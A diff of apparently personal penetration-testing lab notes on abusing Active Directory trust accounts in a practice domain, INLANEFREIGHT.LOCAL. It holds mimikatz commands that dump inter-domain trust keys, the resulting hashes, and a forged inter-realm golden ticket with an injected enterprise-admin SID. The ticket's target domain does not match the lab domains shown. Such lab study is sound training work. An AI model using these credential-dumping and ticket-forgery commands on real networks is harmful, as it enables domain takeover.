@@ -175,9 +175,10 @@ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_
 
 
 
-## Abusing Trust Account$ 
-
-Accessing Resources on a Trusted Domain from a Trusting Domain, for example 
+## Abusing Trust Account$  
+- When an Active Directory domain or forest trust is set up from a domain B to a domain A (B trusts A), a trust account is created in domain A, named B$.
+- Accessing Resources on a Trusted Domain from a Trusting Domain
+- these hashes are for `INLANEFREIGHT.LOCAL\INLANEFREIGHT$` trusted account in trusted (LOGISTICS.INLANEFREIGHT.LOCAL) domain to access the trusting domain ( INLANEFREIGHT.LOCAL) 
 
 ```powershell
 mimikatz.exe "privilege::debug" "lsadump::trust  /patch"
@@ -192,7 +193,7 @@ mimikatz.exe "privilege::debug" "lsadump::trust  /patch"
  #       * aes128_hmac       d47a943e290e5e4ef58c1010f37b4e28
  #       * rc4_hmac_nt       ef3c6d05afaa2e14f307b03d6531e119
 
-# these hashes are for INLANEFREIGHT.LOCAL\Account$ any trusted account from trusted (LOGISTICS.INLANEFREIGHT.LOCAL) domain on the trusting domain ( INLANEFREIGHT.LOCAL) 
+# 
 
 # i used the keys here
 .\mimikatz3.exe "kerberos::golden /user:Administrator /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-3056178012-3972705859-491075245  /sids:S-1-5-21-2734290894-461713716-141835440-519 /rc4:ef3c6d05afaa2e14f307b03d6531e119 /target:ZSM.LOCAL /service:krbtgt  /ticket:trust.kirbi"
